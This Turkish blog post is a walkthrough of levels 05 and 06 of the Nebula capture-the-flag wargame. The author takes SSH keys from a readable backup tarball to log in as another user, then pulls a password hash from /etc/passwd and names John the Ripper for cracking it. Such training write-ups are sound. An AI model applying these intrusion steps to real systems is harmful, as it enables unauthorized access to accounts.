---
layout: post
title: "Nebula Write Up-2"
date: 2018-02-28
excerpt: "[Level 05-Level 09]"
comments: false
---
### Level 05

/home/flag05 dizininde, izinleri hatalı olabilecek olan bir dizin arıyoruz. 
{% raw %}
    level05@nebula:/home/flag05$ ls -al
    total 5
    drwxr-x--- 1 flag05 level05  100 2012-08-18 03:22 .
    drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
    drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
    -rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
    -rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
    -rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
    drwx------ 1 flag05 flag05   100 2011-11-20 03:07 .ssh
{% endraw %}
Dikkatimizi çeken .ssh ve .backup dizinleri. Fakat .ssh dizininin izinleri olması gerektiği gibi. .backup dizinini kurcalamaya devam ediyoruz.
> Bir dizin için ls komutunu kullanabilmek için  okuma(r) , cd komutunu kullanabilmek için çalıştırma(x) iznimizin bulunması gerekir.
{% raw %}
    level05@nebula:/home/flag05$ cd .backup
    level05@nebula:/home/flag05/.backup$
    drwxr-x--- 1 flag05 flag05    100  2011-11-20 03:22 .
    drwxr-xr-x 1 flag05 level05    80  2012-08-18 07:18 ..
    -rw-rw-r-- 1 flag05 flag05   1826  2011-11-20 20:13 backup-19072011.tgz
{% endraw %}
Yeterli izinlerimizin olmaması sebebiyle tar dosyasını bulunduğumuz yerde açamıyoruz. 
{% raw %}
    level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp
    level05@nebula:/home/flag05/.backup$ cd /tmp
    level05@nebula:/tmp$ ls -l
    -rw-rw-r-- 1 level05 level05   1826  2011-11-20 20:13 backup-19072011.tgz
    level05@nebula:/tmp$ tar -xvf backup-19072011.tgz
    .ssh/
    .ssh/id_rsa.pub
    .ssh/id_rsa
    .ssh/authorized_keys
{% endraw %}
flag05 kullanıcısının home dizininde bulunan ssh dizini, tar dosyasından çıkan anahtarları kullanarak ssh bağlantısı yapabileceğimiz fikrini veriyor.Ayrıca level05 kullanıcısının home dizinine baktığımızda halihazırda bir ssh dizini olduğunu görüyoruz.
Tar dosyasından çıkan anahtarların hangi kullanıcı tarafından oluşturulduğunu bilmediğimiz için anahtarların tamamını level05 kullanıcısının ssh dizinine kopyalıyoruz.
{% raw %}
    level05@nebula:/tmp$ cp .ssh/* /home/level05/.ssh
    level05@nebula:/tmp$ ssh flag05@nebula
    The authenticity of host 'nebula (127.0.1.1)' can't be established.  
    ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.  
    Are you sure you want to continue connecting (yes/no)? yes  
    Warning: Permanently added 'nebula' (ECDSA) to the list of known hosts.

          _   __     __          __
         / | / /__  / /_  __  __/ /___ _
        /  |/ / _ \/ __ \/ / / / / __ `/
      / /|  /  __/ /_/ / /_/ / / /_/ /
      /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula

    For level descriptions, please see the above URL.

    To log in, use the username of "levelXX" and password "levelXX", where  
    XX is the level number.

    Currently there are 20 levels (00 - 19).

    Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

    * Documentation:  https://help.ubuntu.com/
    Your Ubuntu release is not supported anymore.  
    For upgrade information, please visit:  
    http://www.ubuntu.com/releaseendoflife

    New release '12.04.3 LTS' available.  
    Run 'do-release-upgrade' to upgrade to it.

    The programs included with the Ubuntu system are free software;  
    the exact distribution terms for each program are described in the  
    individual files in /usr/share/doc/*/copyright.

    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by  
    applicable law.

    flag05@nebula:~$ /bin/getflag  
    You have successfully executed getflag on a target account  
{% endraw %}
### Level 06
flag06 kullanıcına ait bilgilerin eski bir unix sistemden geldiği bilgisi verilmiş. Credentials kelimesi ilk olarak /etc/passwd ve /etc/shadow dosyalarını hatırlatıyor. Fakat /etc/shadow dosyasını okumak için gerekli izinlerimiz bulunmadığı için /etc/passwd dosyasını kurcalıyoruz.
{% raw %}
    level06@nebula:~$ cat /etc/passwd | grep flag06
    flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
{% endraw %}
> /etc/passwd dosyası tüm kullanıcılar tarafından okunabildiği için, şifrelenmiş parolalar bu dosyada gösterilmez.Bunun yerine x ile temsil edilir. Parolalar şifrelenmiş bile olsa parola-kırma araçlarıyla bu parolaları kırmak mümkün olabilir.
Burda ise şifrelenmişde olsa flag06 kullanıcısına ait parola, tüm kullanıcılar tarafından okunabilir olan /etc/passwd dosyasında gösterilmiş. 
> John The Ripper en çok bilinen parola kırma araçlarından biridir.Kali Linux, Parrot gibi güvenlik dağıtımlarında hazır olarak bulunmaktadır.
<figure class="half">
	<a href="/assets/img/xx.png"><img src="/assets/img/xx.png"></a>
	<a href="/assets/img/xx.png"><img src="/assets/img/xx.png"></a>
</figure>
